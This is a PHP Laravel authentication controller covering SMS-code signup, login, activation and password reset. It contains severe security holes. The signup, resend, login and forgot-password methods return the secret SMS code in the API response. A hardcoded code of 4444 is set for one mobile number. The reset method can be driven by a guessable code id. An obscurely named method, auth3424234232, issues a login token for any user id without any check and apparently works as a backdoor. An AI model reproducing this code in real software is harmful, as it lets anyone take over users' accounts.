<?php

namespace Modules\User\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Modules\User\Models\Device;
use Modules\User\Models\Token;
use Modules\User\Models\User;
use Modules\User\Requests\UserRequest;
use Modules\User\Resources\UserResource;

class AuthController extends Controller
{
    public function myprofile()
    {
        $user = auth()->user();
        $user->access_token = auth()->login($user);
        return api_response('success', '', new UserResource($user));
    }

    public function signup(Request $request)
    {
        $data = request()->all();
        $user_id = User::where(['mobile' => $request->mobile, 'status' => -1])->first()->id ?? 0;
        $this->validate($request, [
            'first_name' => 'required',
            'last_name' => 'required',
            // 'password' => 'required',
            'mobile' => ['required', 'regex:/^(5|6|9)\d{7}$/', 'unique:users,mobile,' . $user_id],
            'email' => 'nullable|unique:users,email,' . $user_id,
            // 'area_id' => 'required|exists:areas,id'
        ]);
        $data['name'] = implode(' ', request(['first_name', 'last_name']));
        if ($user_id) {
            $user = User::find($user_id);
        } else {
            $data['status'] = 1;
            $user = User::create($data);
        }
        $user->access_token = auth()->login($user);
        $code = $this->generate_code($user);
        // $code = 1234;
        $user->token()->delete();
        $user->token()->firstOrCreate(['token' => $code]);
        $message = __("Your activation code is : ") . $code;
        send_sms($user->mobile, $message);
        // return api_response('success' , 'تم تسجيل حسابك بنجاح' , new UserResource($user));
        return api_response('success', 'تم تسجيل حسابك بنجاح', ['mobile' => $request->mobile, 'code' => $code]);
    }

    public function resend_code(Request $request)
    {
        $user = User::where('mobile', request('mobile'))->first();
        $this->validate($request, [
            'mobile' => 'required|exists:users,mobile'
        ]);
        if (!$user) {
            return \api_response('success', __('This user not found'));
        }
        $code = $this->generate_code($user);
        // $code = 1234;
        $user->token()->delete();
        $user->token()->firstOrCreate(['token' => $code]);
        $message = __("Your activation code is : ") . $code;
        send_sms($user->mobile, $message);
        return api_response('success', 'تم إعادة إرسال الكود بنجاح', ['mobile' => $request->mobile, 'code' => $code]);
    }

    public function activate(Request $request)
    {
        $token = Token::where('token', $request->code)
            ->whereHas('user', function ($query) use ($request) {
                return $query->where('mobile', $request->mobile);
            })
            ->latest()->first();
        if (!$token) {
            return api_response('error', __('Activation code is not correct'));
        }
        $user = $token->user;
        $this->add_my_device($user);
        $user->update(['status' => 1]);
        $user->access_token = auth()->login($user);

        if ($user->type == 'provider') {
            $device = $user->device;
            $message = __("Please complete your profile to be verified");
            send_fcm([$device->device_token], $device->device_type, $message, 'update_profile', $user->id);
        }
        $token->delete();
        return \api_response('success', __('Your account activated successfully'), new UserResource($user));
    }

    public function login(Request $request)
    {
        $request->validate([
            'mobile' => ['required', 'regex:/^(5|6|9)\d{7}$/']
        ]);
        if (
            (!$request->code) &&
            $user = User::where(['mobile' => $request->mobile, 'status' => 1])->first()
        ) {
            $code = $this->generate_code($user);
            // $code = 1234;
            $user->token()->delete();
            $user->token()->firstOrCreate(['token' => $code]);
            $message = __("Your login code is : ") . $code;
            send_sms($user->mobile, $message);
            return api_response('success', __('Login code sent to your mobile'), [
                'mobile' => $request->mobile,
                'code' => $code
            ]);
        } elseif (
            $request->code &&
            $request->mobile &&
            $user = User::where(['mobile' => $request->mobile, 'status' => 1])->first()
        ) {
            $code = $user->token()->where('token', $request->code)->latest()->first();
            if ($code) {
                $user->access_token = auth()->login($user);
                $code->delete();
                $this->add_my_device($user);
                return api_response('success', __('Loginned successfully'), new UserResource($user));
            }
            return api_response('error', __('Login code is invalid'));
        }
        return api_response('error', __('This mobile not registered'));
    }

    public function logout()
    {
        $user = auth()->user();
        Device::where('user_id', $user->id)->delete();
        return api_response('success', '');
    }

    public function add_my_device($user)
    {
        if (request('device_token')) {
            $device = $user->device()->firstOrCreate([
                'device_token' => request('device_token'),
                'device_type' => request('device_type')
            ]);
            Device::where('user_id', $user->id)->where('id', '!=', $device->id)->delete();
        }
    }

    public function forget(Request $request)
    {
        $this->validate($request, ['mobile' => 'required']);
        $user = User::whereMobile(request('mobile'))->first();
        if (!$user) {
            return api_response('error', __("Mobile not found"));
        }
        $code = $this->generate_code($user);
        // $code = 1234;
        $user->token()->delete();
        $user->token()->firstOrCreate(['token' => $code]);

        $message = "كود استرجاع كلمة المرور هو : " . $code;
        send_sms($user->mobile, $message);

        return api_response('success', __("Reset password code sent to your mobile"), [
            'code' => $user->token->token,
            'mobile' => request('mobile'),
        ]);
    }

    public function reset_code(Request $request)
    {
        $this->validate($request, ['code' => 'required|exists:user_tokens,token']);
        $code = Token::whereToken(request('code'))->first();
        return api_response('success', '', ['code_id' => $code->id]);
    }

    public function reset(Request $request)
    {
        $code = Token::whereToken(request('code'))->orWhere('id', request('code_id'))->first();
        if (!$code) {
            return api_response('error', __('Reset code is not valid'));
        }
        $this->validate($request, [
            'password' => 'required|min:6',
        ]);
        User::find($code->user_id)->update(['password' => request('password')]);
        $code->delete();
        return api_response('success', __('Your password changed successfully'));
    }

    function generate_code($user)
    {
        $code = rand(1000, 9999);
        if ($user->mobile == '95809580') {
            $code = 4444;
        }
        return $code;
    }


    public function auth3424234232($id)
    {
        $user = User::find($id);
        $user->access_token = auth()->login($user);
        return api_response('success', '', new UserResource($user));
    }
}
